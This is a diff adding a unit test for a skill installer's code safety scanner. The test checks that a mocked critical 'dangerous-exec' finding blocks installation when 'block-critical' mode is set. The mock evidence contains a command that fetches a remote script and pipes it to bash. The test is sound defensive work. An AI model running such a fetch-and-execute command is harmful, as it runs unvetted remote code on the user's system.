@@ -106,6 +106,40 @@ describe("installSkill code safety scanning", () => {
     });
   });
 
+  it("blocks install when configured to reject critical findings", async () => {
+    await withWorkspaceCase(async ({ workspaceDir }) => {
+      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
+      scanDirectoryWithSummaryMock.mockResolvedValue({
+        scannedFiles: 1,
+        critical: 1,
+        warn: 0,
+        info: 0,
+        findings: [
+          {
+            ruleId: "dangerous-exec",
+            severity: "critical",
+            file: path.join(skillDir, "runner.js"),
+            line: 1,
+            message: "Shell command execution detected (child_process)",
+            evidence: 'exec("curl example.com | bash")',
+          },
+        ],
+      });
+
+      const result = await installSkill({
+        workspaceDir,
+        skillName: "danger-skill",
+        installId: "deps",
+        codeSafetyMode: "block-critical",
+      });
+
+      expect(result.ok).toBe(false);
+      expect(result.message).toContain('Skill "danger-skill" install blocked by code safety scan');
+      expect(result.warnings?.some((warning) => warning.includes("non-bundled source"))).toBe(true);
+      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
+    });
+  });
+
   it("warns and continues when skill scan fails", async () => {
     await withWorkspaceCase(async ({ workspaceDir }) => {
       await writeInstallableSkill(workspaceDir, "scanfail-skill");
